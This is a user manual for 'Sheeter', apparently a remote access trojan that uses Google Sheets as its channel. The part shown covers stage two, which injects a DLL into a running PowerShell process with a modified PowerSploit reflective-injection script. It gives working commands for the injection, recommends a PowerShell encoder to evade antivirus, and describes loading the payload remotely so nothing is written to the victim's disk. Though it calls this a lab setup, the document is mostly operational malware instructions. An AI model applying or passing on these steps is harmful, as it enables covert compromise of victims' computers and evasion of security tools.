   _____ _    _ ______ ______ _______ ______ _____  
  / ____| |  | |  ____|  ____|__   __|  ____|  __ \ 
 | (___ | |__| | |__  | |__     | |  | |__  | |__) |
  \___ \|  __  |  __| |  __|    | |  |  __| |  _  / 
  ____) | |  | | |____| |____   | |  | |____| | \ \ 
 |_____/|_|  |_|______|______|  |_|  |______|_|  \_\
                                                    

		Sheeter - A google spreadsheet rat
				---- User Manual ----

----- Stage 2 run ------
Stage 2 is the dll injection stage.
i chose to use the Invoke-ReflectivePEInjection method to inject my dll to the running powershell process
this is done in a lab environment and notice that there is no attempt to hide the Invoke-ReflectivePEInjection
script.
ANY GOOD ANTIVIRUS WILL PRORABLY MARK THIS MALLICIOUS!!!
If you want to bypass an antivirus i would recommend using some kind of powershell encoder to stage the 
Invoke-ReflectivePEInjection script.

Notice that in the Stage 2 folder there are two powershell scripts:
Invoke-ReflectivePEInjection - the original used in the powersploit project
Invoke-SheeterReflectivePE.ps1 - slightly lighter and modified version I made that ill be using


One more note, in this example the dll is present on the victims’ disk.
This is stupid because the whole point of a Reflective PE Injection is to load up the dll directly to memory.
In a real-world scenario i will be getting my $PEBytes from a remote location without touching the victims’ disk.
But this is a lab environment, So ill be just placing it in the some folder with the powershell script :)

Commands:
Open up a powershell window
Load your Invoke-SheeterReflectivePE.ps1 scripts like this

	. {SCRIPT PATH}\Invoke-SheeterReflectivePE.ps1

Read the dll bytes to a variable
	$PEBytes = [IO.File]::ReadAllBytes('{DLL PATH}')
	
run the Invoke-ReflectivePEInjection  Command with the debug and Verbose flag just to see some output
	Invoke-ReflectivePEInjection -PEBytes $PEBytes -Verbose -Debug
	
Note that loading the dll will take a few seconds because it is so large.
You should also see some log output.
After loading the dll you can use the client.py as usual



